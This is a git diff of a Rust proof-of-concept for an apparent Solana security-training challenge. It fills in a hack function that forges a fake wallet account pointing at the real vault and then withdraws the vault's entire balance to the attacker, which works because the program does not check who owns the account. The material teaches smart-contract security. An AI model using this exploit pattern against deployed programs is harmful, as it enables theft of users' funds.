@@ -11,6 +11,10 @@ use pocs::assert_tx_success;
 use solana_program::native_token::lamports_to_sol;
 use solana_program::{native_token::sol_to_lamports, pubkey::Pubkey, system_program};
 
+use borsh::BorshSerialize;
+use level0::{Wallet, WalletInstruction};
+use solana_program::instruction::{AccountMeta, Instruction};
+
 struct Challenge {
     hacker: Keypair,
     wallet_program: Pubkey,
@@ -21,12 +25,39 @@ struct Challenge {
 
 // Do your hacks in this function here
 fn hack(_env: &mut LocalEnvironment, _challenge: &Challenge) {
-
     // Step 0: how much money do we want to steal?
+    let amount = _env.get_account(_challenge.vault_address).unwrap().lamports; // vault balance
+    println!("Trying to steal {} lamports", amount.green());
 
     // Step 1: a fake wallet with the same vault
+    let hack_wallet = Wallet {
+        authority: _challenge.hacker.pubkey(),
+        vault: _challenge.vault_address,
+    };
+
+    let fake_wallet = keypair(123);
+    let mut hack_wallet_data: Vec<u8> = vec![];
+
+    hack_wallet.serialize(&mut hack_wallet_data).unwrap();
+
+    _env.create_account_with_data(&fake_wallet, hack_wallet_data);
 
     // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
+    _env.execute_as_transaction(
+        &[Instruction {
+            program_id: _challenge.wallet_program,
+            accounts: vec![
+                AccountMeta::new(fake_wallet.pubkey(), false),
+                AccountMeta::new(_challenge.vault_address, false),
+                AccountMeta::new(_challenge.hacker.pubkey(), true),
+                AccountMeta::new(_challenge.hacker.pubkey(), false),
+                AccountMeta::new_readonly(system_program::id(), false),
+            ],
+            data: WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
+        }],
+        &[&_challenge.hacker],
+    )
+    .print();
 }
 
 /*
